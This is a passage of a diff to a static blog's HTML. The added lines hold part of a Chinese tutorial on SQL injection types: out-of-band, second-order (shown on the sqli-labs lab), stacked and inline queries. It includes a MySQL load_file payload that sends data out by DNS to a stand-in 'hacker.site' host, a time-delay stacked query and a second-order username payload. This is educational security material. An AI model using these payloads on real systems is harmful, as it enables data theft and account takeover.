+<h4 id="Out-of-band-SQLi"><a href="#Out-of-band-SQLi" class="headerlink" title="Out-of-band SQLi"></a>Out-of-band SQLi</h4><p>带外数据（<code>OOB</code>）的这种攻击方式，在各种盲攻击中都有此概念，如在 XXE 盲注。笔者对 <code>OOB</code> 型 SQL 注入的理解是，在 SQL 注入攻击中，攻击者的 Payload 代码成功执行了，但由于各种因素所致，结果无法通过 <code>HTTP Response</code> 来答复攻击者的 <code>HTTP Request</code>，攻击者也就无法从这种“信道”获取 payload 产生的数据。而 <code>OOB</code> 中，攻击者通过构造特殊的 Payload，让受害主机向指定主机发送 HTTP 请求或 DNS 查询，而这些请求报文中携带了查询结果的数据。</p>
+<p>如 MySQL 下有：</p>
+<blockquote>
+<p>select load_file(concat(‘\\‘,version(),’.hacker.site\a.txt’));</p>
+</blockquote>
+<p>具体 DNS 查询报文如下图：</p>
+<p><img src="/2018/01/25/SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3/4.webp.jpg" alt="img"></p>
+<h3 id="Second-order-Injection"><a href="#Second-order-Injection" class="headerlink" title="Second order Injection"></a>Second order Injection</h3><p>第二大类型就是二级注入了。通常网站开发者可能会十分注意与用户发生交互的地方，自然这些地方就很少会有 SQL 注入漏洞了。而开发者对从数据库查询出来的信息可能十分信任，而这就是攻击者的机会所在——即便从数据库查询出来的数据也不是可靠的。</p>
+<p>在 <code>sqli-labs</code> 的 24 关中，我们在在注册一个用户名为 <code>&#39;admin&#39; or &#39;1&#39;=&#39;1</code> 之后，使用该用户登录，并修改该用户的密码为  <code>123</code>，可以发现，用户 <code>admin</code> 的密码被修改为 <code>123</code></p>
+<p><img src="/2018/01/25/SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3/5.png" alt="img"></p>
+<p><img src="/2018/01/25/SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3/6.webp.jpg" alt="img"></p>
+<p><img src="/2018/01/25/SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3/7.webp.jpg" alt="img"></p>
+<p>在重置密码时，使用的 SQL 语句是：</p>
+<blockquote>
+<p>UPDATE users SET PASSWORD=’$pass’ where username=’$username’ and password=’$curr_pass’</p>
+</blockquote>
+<p>由于变量 <code>$username</code> 的值时从数据库中查询出来，开发者并没有对其进行过滤处理，所以产生了 SQL 注入。我们在修改密码时实际上修改的时 <code>admin</code> 帐号的密码。</p>
+<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p><strong>Stacked queries</strong></p>
+<p>堆叠查询是指在一次数据库语句查询中，可以同时执行多条语句。如下面例子，我们在一次 MSSQL 数据库注入中同时执行了两条语句：</p>
+<blockquote>
+<p>select username from usertable where passwd=’123’;waitfor delay ‘0:0:5’ –%20</p>
+</blockquote>
+<p>而堆叠查询本质上还是使用的其他注入方法，只不过堆叠查询的结果无法直接回显，通常在堆叠查询中我们可以尝试使用延迟注入、<code>OOB</code> 等方法来获取数据。</p>
+<p>关于堆叠查询的发生前提情况具体可以参考下图：</p>
+<p><img src="/2018/01/25/SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3/8.webp.jpg" alt="img"></p>
+<p>通过在堆叠查询中使用存储过程还可以绕过 WAF。这篇文章就是很好的例子：</p>
+<blockquote>
+<p>http:/<a href="http://www.freebuf.com/column/145771.html" target="_blank" rel="noopener">www.freebuf.com/column/145771.html</a></p>
+</blockquote>
+<p><strong>Inline Queries</strong></p>
+<p>Sqlmap 作者给这种注入起了个这个名字或是说使用了这个名字，中文翻译过来刚刚好和内联查询（Inner Join） 冲突了，笔者也是懵逼了很久。后来经过一番查阅，才知道这个 <code>Inline Queries</code> 指的是内联视图（Inline View）。内联视图能够创建临时表，在处理某些查询情况时十分有用。</p>
+<p>假如有 <code>User_Address</code> 表，里面有用户邮编 <code>ZIP_CODE</code>，而另外一张表 <code>User_Score</code>，则记录的每个用户的分数，且这两张表有相同的列 <code>“User_ID”</code>。</p>
+<p>如果我们想找出得分超过 200 的用户的邮编时，利用内联视图可以一句话就搞定，具体如下：</p>
+<p><img src="/2018/01/25/SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3/9.webp.jpg" alt="img"></p>
+<p>可以参考 <code>SQL Inline View</code></p>
+<blockquote>
+<p>https:/<a href="http://www.1keydata.com/sql/inline-view.html" target="_blank" rel="noopener">www.1keydata.com/sql/inline-view.html</a></p>
+</blockquote>
+<p>进行学习。</p>
+<p>在 Sqlmap 的 <code>boundaries.xml</code> 文档中的 <code>clause</code> 标签说明中，作者给出了他们认为 SQL 语句存在注入点的 10 种情况，如下：</p>
+<p><img src="/2018/01/25/SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3/10.webp.jpg" alt="img"></p>
+<p>而 <code>Inline Queries SQLI</code> 有 <code>1、2、3、8</code> 共四种情况，笔者尝试使用 Sqlmap 来对 MySQL 的 <code>Inline Queries</code> 语句进行注入，发现 Sqlmap 识别出的注入方式并不是 <code>Inline Queries</code>，而其源码中确实有该种注入的 Payload，笔者也未曾遇到过该种注入，对此也只能表示疑惑了。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这篇文章的大体轮廓在笔者学完 SQL 注入一个星期后就开始写了，当时的笔者十分恼火，为什么找不到一篇能够帮笔者理解 SQL 注入类型的文章，所以决定自己参悟并写一篇。又经过一番学习一番修改，这篇文章就出炉了，起初想加入一些“高级点”的东西，但是和文章标题不符合，就算了，有机会再补上吧。希望本文对大家有所帮助，谢谢！</p>
 
       
 
@@ -380,7 +304,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/01/25/SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3/">展开全文 >></a>
         </p>
       
 
@@ -412,7 +336,7 @@
   
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/13/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="page-number" href="/page/13/">13</a><span class="page-number current">14</span><a class="page-number" href="/page/15/">15</a><a class="page-number" href="/page/16/">16</a><span class="space">&hellip;</span><a class="page-number" href="/page/22/">22</a><a class="extend next" rel="next" href="/page/15/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/21/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/20/">20</a><a class="page-number" href="/page/21/">21</a><span class="page-number current">22</span>
     </nav>
   
 
